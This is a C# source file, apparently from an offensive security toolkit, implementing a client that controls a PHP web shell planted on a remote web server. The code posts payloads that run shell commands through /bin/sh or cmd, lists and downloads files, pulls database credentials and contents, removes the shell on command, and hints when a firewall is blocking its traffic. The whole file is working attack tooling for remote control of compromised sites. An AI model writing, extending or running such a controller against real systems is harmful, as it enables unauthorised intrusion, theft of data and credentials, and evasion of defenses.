using C2.Core;
using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace C2.Business.CastleBravo.WebShellTool
{
    public class WebShellClient
    {
        private readonly string url;       
        private readonly IClient client;
        private string lastErrorMessage;
        private readonly string databaseInfo;
        public string FetchLog() 
        {
            string ret = lastErrorMessage + Environment.NewLine + client.FetchLog(); // 错误日志特意放在第一行
            lastErrorMessage = string.Empty;
            return ret;
        }

        public WebShellClient(string url, string password, string clientSetting, string databaseInfo)
        {
            this.url = url;
            this.lastErrorMessage = string.Empty;
            this.client = ClientFactory.Create(password, clientSetting);
            this.databaseInfo = databaseInfo;

        }

        public string Suscide()
        {
            return Post(this.client.Suscide());
        }
        public Tuple<string, string> ShellStart()
        {
            List<string> paths = PHPIndex();
            return paths.IsEmpty() ? Tuple.Create(string.Empty, string.Empty) : Tuple.Create(paths[0], string.Empty);
        }

        public Tuple<string, string> Excute(string root, string command)
        {
            Tuple<string, string> shellParams = client.GetShellParams();
            string splitS = shellParams.Item1;
            string splitE = shellParams.Item2;

            //需要先判断是什么系统
            bool isLinux = root.StartsWith("/");
            string shellEnv = isLinux ? "/bin/sh" : "cmd";
            string template = isLinux ? "cd \"{0}\";{1};echo " + splitS + ";pwd;echo " + splitE : "cd /d \"{0}\"&{1}&echo " + splitS + "&cd&echo "+ splitE;
            
            string remoteCmd = string.Format(template, root, command);

            string[] ret = PHPShell(shellEnv, remoteCmd).Split(splitS);

            try
            {
                ret[0] = isLinux ? ret[0].Replace("\n", "\r\n") : ret[0];
                root   = ret[1].Split(splitE)[0].Trim(new char[] { '\n', '\r' });
            }
            catch
            {
                return Tuple.Create(root, string.Empty) ;
            }

            return Tuple.Create(root, ret[0]);
        }

        public Tuple<string, List<WSFile>, List<string>> PathBrowser()
        {
            return PathBrowser(PHPIndex());
        }
        public Tuple<string, List<WSFile>, List<string>> PathBrowser(string path)
        {
            return PathBrowser(new List<string>() { path });
        }

        public Tuple<string, List<WSFile>, List<string>> PathBrowser(List<string> paths)
        {
            List<WSFile> children = new List<WSFile>();
            List<string> brothers = new List<string>();

            if (paths.Count == 0 || string.IsNullOrEmpty(paths[0]))
                return Tuple.Create(string.Empty, children, brothers);

            string root = paths[0];

            //broPath仅针对window文件系统，内容为c: d: e:
            if (paths.Count == 2 && paths[1].Contains(":"))
            {
                foreach (string path in paths[1].Split(':'))
                    brothers.Add(path.Trim());
            }
                

            string ret = PHPReadDict(root).Replace("|","\t");
            foreach (string line in ret.Split('\n'))
            {
                string[] info = line.Split('\t');
                if (info.Length < 4 || info[0].IsNullOrEmpty() || info[0] == "./" || info[0] == "../" || info[0] == "->")
                    continue;

                children.Add(new WSFile(info[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
                                        info[0].TrimEnd('/'),
                                        info[1],
                                        info[2],
                                        info[3]));
            }
            return Tuple.Create(root, children, brothers);
        }
        public string PHPInfo()
        {
            return client.ExtractResponse(Post(client.PHPInfo()));
        }

        public List<string> PHPIndex(int timeout = Global.WebClientDefaultTimeout)
        {
            return client.ParseCurrentPath(client.ExtractResponse(Post(client.PHPIndex(), true, timeout)));
        }

        public string PHPReadDict(string dict)
        {
            return client.ExtractResponse(Post(client.PHPReadDict(dict), true));
        }

        public string PHPShell(string shellEnv, string command)
        {
            return client.ExtractResponse(Post(client.PHPShell(shellEnv, command), true));
        }

        public string DetailInfo(string PageData)
        {
            return client.ExtractResponse(Post(client.DetailInfo(PageData)));
        }

        public byte[] DownloadFile(string pageData)
        {
            return PostDownload(client.DownloadFile(pageData), true);
        }
        public string DatabeseInfo(string DBConfig, string database, string command) 
        {

            return client.ExtractResponse(Post(client.GetDatabaseInfo(ChangeDBLoginInfo(DBConfig), database, command)));
        }
        private string ChangeDBLoginInfo(string config) 
        {
            string host = ChangeInfo("HOST:(.+)\r\n", config);
            string user = ChangeInfo("USER:(.+)\r\n", config);
            string password = ChangeInfo("PASS:(.+)\r\n", config);

            return string.Format("{0}choraheiheihei{1}choraheiheihei{2}",
                    host,
                    user,
                    password);
        }
        public string DatabeseInfo() 
        {
            return DatabeseInfo(this.databaseInfo);
        }
        private string DatabeseInfo(string config)
        {
            if (string.IsNullOrEmpty(config)) 
            {
                this.lastErrorMessage = "数据库配置信息未填写";
                return string.Empty;
            }
            return client.ExtractResponse(Post(client.GetDatabaseInfo(ChangeDBLoginInfo(config), string.Empty, string.Empty)));
        }
        private string ChangeInfo(string word, string info) 
        {
            try
            {
                Regex reg = new Regex(word);
                Match match = reg.Match(info);
                if(match.Success)
                    return match.Groups[1].Value;
            }
            catch 
            {
                this.lastErrorMessage = "数据库配置格式不正确";
            }
            return string.Empty;
        }

        private string Post(string payload, bool logRsp = false, int defaultTimeout = Global.WebClientDefaultTimeout)
        {
            if (string.IsNullOrEmpty(payload))
                return string.Empty;

            this.lastErrorMessage = string.Empty;
            try
            {
                string rsp = WebClientEx.Post(this.url, payload, defaultTimeout, ProxySetting.Empty);
                if (logRsp) 
                    client.AppendLog(Environment.NewLine)
                          .AppendLog("返回报文:")
                          .AppendLog(Environment.NewLine)
                          .AppendLog(rsp)
                          .AppendLog(Environment.NewLine);
                return rsp;
            }
            catch (Exception e)
            {
                this.lastErrorMessage = WafDector(e.Message);
                return string.Empty;
            }   
        }
        private byte[] PostDownload(string payload, bool logRsp = false, int defaultTimeout = Global.WebClientDefaultTimeout)
        {
            if (string.IsNullOrEmpty(payload))
                return new byte[] { };

            this.lastErrorMessage = string.Empty;
            try
            {
                byte[] rsp = WebClientEx.PostDownload(this.url, payload, defaultTimeout, ProxySetting.Empty);
                if (logRsp)
                    client.AppendLog(Environment.NewLine)
                          .AppendLog("返回报文:")
                          .AppendLog(Environment.NewLine)
                          .AppendLog(Environment.NewLine);
                return rsp;
            }
            catch (Exception e)
            {
                this.lastErrorMessage = WafDector(e.Message);
                return new byte[] { };
            }
        }


        private string WafDector(string msg)
        {
            if (msg.StartsWith("基础连接已经关闭: 接收时发生错误"))
                return string.Format("{0}{1}WAF探测参考:可能被WAF拦截{1}", msg, Environment.NewLine);
            if (msg.StartsWith("远程服务器返回错误: (500) 内部服务器错误。"))
                return string.Format("{0}{1}WAF探测参考:可能密码错误,Payload语法不正确或被WAF拦截{1}", msg, Environment.NewLine);
            return string.Format("{0}{1}", msg, Environment.NewLine);
        }

    }

    public enum WebShellFileType
    {
        Null,
        Directory,
        File
    }

    public class WSFile
    {
        public WebShellFileType Type { get; set; }
        public string FileName { get; set; }
        public string CreateTime { get; set; }
        public string FileSize { get; set; }
        public string LastMod { get; set; }

        public WSFile(WebShellFileType type, string fileName, string createTime, string fileSize, string lastMod)
        {
            Type = type;
            FileName = fileName;
            CreateTime = createTime;
            FileSize = fileSize;
            LastMod = lastMod;
        }
    }
}

